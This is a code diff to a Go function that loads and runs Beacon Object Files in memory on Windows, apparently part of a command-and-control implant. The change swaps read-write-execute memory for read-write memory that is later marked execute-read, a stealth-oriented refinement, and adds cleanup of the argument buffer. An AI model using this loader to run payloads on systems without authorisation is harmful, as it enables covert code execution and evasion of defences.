@@ -256,11 +256,7 @@ func loadAndRunBOF(bofData []byte, args string) (uintptr, error) {
 		if size == 0 {
 			continue
 		}
-		prot := uint32(windows.PAGE_READWRITE)
-		if sh.Characteristics&0x20000000 != 0 { // executable
-			prot = uint32(windows.PAGE_EXECUTE_READWRITE)
-		}
-		addr, err := windows.VirtualAlloc(0, uintptr(size), windows.MEM_COMMIT|windows.MEM_RESERVE, prot)
+		addr, err := windows.VirtualAlloc(0, uintptr(size), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 		if err != nil || addr == 0 {
 			return 0, fmt.Errorf("bof: VirtualAlloc failed for section %d", i)
 		}
@@ -270,6 +266,23 @@ func loadAndRunBOF(bofData []byte, args string) (uintptr, error) {
 		if int(sh.PointerToRawData)+int(sh.SizeOfRawData) <= len(bofData) && sh.SizeOfRawData > 0 {
 			src := bofData[sh.PointerToRawData : sh.PointerToRawData+sh.SizeOfRawData]
 			bofMemcpy(unsafe.Pointer(addr), unsafe.Pointer(&src[0]), uintptr(len(src)))
+		}
+	}
+
+	// Change executable sections to PAGE_EXECUTE_READ after data is written
+	for i := range loaded {
+		if loaded[i].baseAddr == 0 {
+			continue
+		}
+		if loaded[i].header.Characteristics&0x20000000 != 0 {
+			sz := loaded[i].header.SizeOfRawData
+			if sz == 0 {
+				sz = loaded[i].header.VirtualSize
+			}
+			if sz > 0 {
+				var oldProt uint32
+				windows.VirtualProtect(loaded[i].baseAddr, uintptr(sz), windows.PAGE_EXECUTE_READ, &oldProt)
+			}
 		}
 	}
 
@@ -530,6 +543,7 @@ func loadAndRunBOF(bofData []byte, args string) (uintptr, error) {
 		if err != nil || argsPtr == 0 {
 			return 0, fmt.Errorf("bof: VirtualAlloc for args failed")
 		}
+		defer windows.VirtualFree(argsPtr, 0, windows.MEM_RELEASE)
 		bofMemcpy(unsafe.Pointer(argsPtr), unsafe.Pointer(&argsData[0]), uintptr(len(argsData)))
 		parser.Original = argsPtr
 		parser.Buffer = argsPtr
